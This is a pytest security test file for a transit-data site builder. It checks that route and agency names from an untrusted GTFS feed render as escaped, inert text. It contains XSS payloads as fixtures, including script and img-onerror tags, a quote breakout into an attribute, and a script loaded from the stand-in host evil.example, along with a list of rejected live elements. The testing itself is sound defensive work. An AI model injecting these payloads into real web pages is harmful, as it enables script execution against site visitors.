"""Security test for D5: externally-sourced strings must render inert.

Route names come from the GTFS feed. We do not control them. This file is the
pin that says so.
"""
import pytest

from tests.site_fixtures import daily_row, uptime_row, write_dataset

from publish.site import InjectionError, assert_inert, build_site
from publish.slugs import slugify

XSS_ID = "<script>alert(1)</script>"
XSS_SHORT = '" onmouseover="alert(2)'
XSS_LONG = "<img src=x onerror=alert(3)>"
XSS_AGENCY = "</table><script src='//evil.example/x.js'></script>"
HOSTILE = (XSS_ID, XSS_SHORT, XSS_LONG, XSS_AGENCY)


def hostile_dataset(tmp_path):
    """Hostile names on three routes covering all three render paths: ranked,
    unranked (too few judged trips), and zero-trial (every trip excluded)."""
    def row(route_id, scheduled, excluded, vanished, untracked):
        return daily_row(
            "2026-06-28", route_id, scheduled=scheduled, excluded=excluded,
            cancelled=0,
            completed=scheduled - excluded - vanished - untracked,
            vanished=vanished, untracked=untracked,
            route_short_name=XSS_SHORT, route_long_name=XSS_LONG,
            agency_name=XSS_AGENCY)

    rows = [
        row(XSS_ID, 100, 0, 5, 1),                 # ranked
        row("HOSTILE_TINY", 12, 0, 1, 0),          # unranked
        row("HOSTILE_BLIND", 40, 40, 0, 0),        # zero trials -> em dashes
        daily_row("2026-06-28", "SAFE", scheduled=50, excluded=0, cancelled=0,
                  completed=48, vanished=1, untracked=1,
                  route_short_name="7", route_long_name="Safe Road",
                  agency_name="Fixtureville Bus"),
    ]
    return write_dataset(tmp_path / "data", daily_rows=rows,
                         uptime_rows=[uptime_row("2026-06-28")],
                         manifest={"coverage": {"first_day": "2026-06-28",
                                                "last_day": "2026-06-28",
                                                "complete_days": 28},
                                   "unnamed_routes": [XSS_ID],
                                   # Published by the VM, hostile ids and all -
                                   # the builder reads this map, so it is part
                                   # of the untrusted input surface.
                                   "route_slugs": {
                                       XSS_ID: "script-alert-1-script",
                                       "HOSTILE_TINY": "hostile-tiny",
                                       "HOSTILE_BLIND": "hostile-blind",
                                       "SAFE": "safe"}})


def all_html(out):
    return {path: path.read_text(encoding="utf-8") for path in out.rglob("*.html")}


def test_no_hostile_string_appears_verbatim_in_any_emitted_file(tmp_path):
    """Field-agnostic: catches a missed esc() on any field, on any page,
    including attribute payloads with no '<' that assert_inert cannot see."""
    out = tmp_path / "_site"
    build_site(hostile_dataset(tmp_path), out)
    pages = all_html(out)
    assert pages
    for path, text in pages.items():
        for payload in HOSTILE:
            assert payload not in text, f"{payload!r} unescaped in {path}"


def test_no_emitted_page_contains_a_script_or_img_tag(tmp_path):
    out = tmp_path / "_site"
    build_site(hostile_dataset(tmp_path), out)
    for path, text in all_html(out).items():
        assert "<script" not in text.lower(), path
        assert "<img" not in text.lower(), path


def test_the_script_route_name_appears_escaped_and_inert(tmp_path):
    # This route's short/long names are the OTHER hostile payloads (see
    # hostile_dataset); its route_id is the one place <script>alert(1)</script>
    # itself renders as text, and that is the route detail page
    # (route.html.tmpl's `route_id=esc(entry["route_id"])`), not the index —
    # route_label() prefers route_short_name over route_id whenever the short
    # name is set, which it always is here.
    out = tmp_path / "_site"
    build_site(hostile_dataset(tmp_path), out)
    page = (out / "route" / "script-alert-1-script.html").read_text(encoding="utf-8")
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in page


def test_quote_injection_cannot_break_out_of_an_attribute(tmp_path):
    out = tmp_path / "_site"
    build_site(hostile_dataset(tmp_path), out)
    index = (out / "index.html").read_text(encoding="utf-8")
    assert "&quot; onmouseover=&quot;alert(2)" in index


def test_hostile_agency_name_is_escaped_on_the_route_page(tmp_path):
    out = tmp_path / "_site"
    build_site(hostile_dataset(tmp_path), out)
    page = (out / "route" / "script-alert-1-script.html").read_text(encoding="utf-8")
    assert "&lt;/table&gt;&lt;script" in page


def test_hostile_route_id_slugifies_to_a_safe_filename(tmp_path):
    # The map now comes from the dataset; the hostile fixture publishes it, so
    # a hostile route id has to survive the round trip through manifest.json
    # and still land on a filename made only of [a-z0-9-].
    assert slugify(XSS_ID) == "script-alert-1-script"
    out = tmp_path / "_site"
    manifest = build_site(hostile_dataset(tmp_path), out)
    assert manifest["route_slugs"][XSS_ID] == "script-alert-1-script"
    assert (out / "route" / "script-alert-1-script.html").is_file()
    for path in (out / "route").iterdir():
        assert all(c.isalnum() or c in "-." for c in path.name), path.name


def test_unnamed_routes_list_on_about_page_is_escaped(tmp_path):
    out = tmp_path / "_site"
    build_site(hostile_dataset(tmp_path), out)
    about = (out / "about-data.html").read_text(encoding="utf-8")
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in about


def test_every_emitted_page_passes_the_tag_allowlist(tmp_path):
    out = tmp_path / "_site"
    build_site(hostile_dataset(tmp_path), out)
    for path, text in all_html(out).items():
        assert_inert(text, str(path))


def test_assert_inert_rejects_an_injected_script():
    with pytest.raises(InjectionError) as excinfo:
        assert_inert("<p>ok</p><script>alert(1)</script>", "doctored.html")
    assert "script" in str(excinfo.value)
    assert "doctored.html" in str(excinfo.value)


def test_assert_inert_rejects_other_live_elements():
    for markup in ("<iframe src=x></iframe>", "<object data=x>", "<embed src=x>",
                   "<svg onload=alert(1)>", "<form action=x>",
                   "<style>x{}</style>", "<base href=x>", "<template>x</template>"):
        with pytest.raises(InjectionError):
            assert_inert(markup)


def test_assert_inert_rejects_a_javascript_href():
    with pytest.raises(InjectionError):
        assert_inert('<a href="javascript:alert(1)">x</a>')


def test_assert_inert_accepts_escaped_hostile_text():
    assert_inert("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>")


def test_assert_inert_does_not_false_positive_on_attribute_like_text():
    assert_inert("<td>x onerror=y</td>")


def test_build_site_raises_if_a_page_would_carry_live_markup(tmp_path, monkeypatch):
    """The guard is wired into build_site, not just available to tests."""
    import publish.site as site

    monkeypatch.setattr(site, "render_methodology",
                        lambda *a, **k: "<!doctype html><html><body><script>x</script></body></html>")
    with pytest.raises(InjectionError):
        build_site(hostile_dataset(tmp_path), tmp_path / "_site")
